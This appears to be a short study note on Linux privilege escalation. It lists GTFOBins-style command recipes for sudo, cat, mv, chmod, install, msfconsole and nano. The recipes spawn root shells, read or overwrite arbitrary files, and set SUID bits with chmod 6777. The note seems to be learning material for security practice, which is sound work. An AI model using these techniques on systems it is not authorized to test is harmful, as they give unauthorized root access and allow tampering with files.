
# ♦ Day 19
</br>
</br>

## ◙ ***Privillage Escalation with comman commands***
 </br>
 
# ♦ `Sudo` : 
   ⇨  If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
</br>
#### Command:

      sudo sudo /bin/sh

   </br>
   </br>

### ♦ `cat` :  

   ⇨  Description: The `cat` command reads data from files and can be used to do privileged reads or disclose files outside a restricted file system. If it has the SUID bit set, it can escalate privileges.
</br>
#### Command: 

   • File Read :

    LFILE=file_to_read
    cat "$LFILE"

   • SUID :

    sudo install -m =xs $(which cat) .

    LFILE=file_to_read
    ./cat "$LFILE"

   • Sudo :

    LFILE=file_to_read
    sudo cat "$LFILE"


# ♦ `mv` : 
   ⇨  The `mv` command can move files from restricted file systems or with elevated privileges. If it has the SUID bit set, it can escalate privileges.


#### Command:

   • SUID :
   
   ```sh
  sudo install -m =xs $(which mv) .

  LFILE=file_to_write
  TF=$(mktemp)
  echo "DATA" > $TF
  ./mv $TF $LFILE
  ```
• Sudo:
   ```sh
  LFILE=file_to_write
  TF=$(mktemp)
  echo "DATA" > $TF
  sudo mv $TF $LFILE
```

### ♦ `chmod` :
   ⇨ The `chmod` command can change file permissions with elevated privileges. If it has the SUID bit set, it can escalate privileges.

**Commands:**
• SUID:
  ```sh
  sudo install -m =xs $(which chmod) .

  LFILE=file_to_change
  ./chmod 6777 $LFILE
  ```
• Sudo:
  ```sh
  LFILE=file_to_change
  sudo chmod 6777 $LFILE
  ```

### ♦ `install` :
     The `install` command can change permissions and execute a copy of the file with elevated privileges. If it has the SUID bit set, it can escalate privileges.

**Commands:**
• SUID:
  ```sh
  sudo install -m =xs $(which install) .

  LFILE=file_to_change
  TF=$(mktemp)
  ./install -m 6777 $LFILE $TF
  ```
• Sudo:
  ```sh
  LFILE=file_to_change
  TF=$(mktemp)
  sudo install -m 6777 $LFILE $TF
  ```

### ♦ `msfconsole` :
   ⇨ The `msfconsole` can spawn a Ruby interpreter to break out of restricted environments and escalate privileges.

**Commands:**
• Shell:
  ```sh
  sudo msfconsole
  msf6 > irb
  >> system("/bin/sh")
  ```
• Sudo:
  ```sh
  sudo msfconsole
  msf6 > irb
  >> system("/bin/sh")
  ```

### ♦ `nano`
   ⇨ The `nano` text editor can be exploited to spawn a shell with elevated privileges if allowed to run as superuser.

**Commands:**
• Sudo:
  ```sh
  sudo nano
  ```
  - In nano, press `Ctrl+R` then `Ctrl+X`, then type:
  ```sh
  reset; sh 1>&0 2>&0
  ```
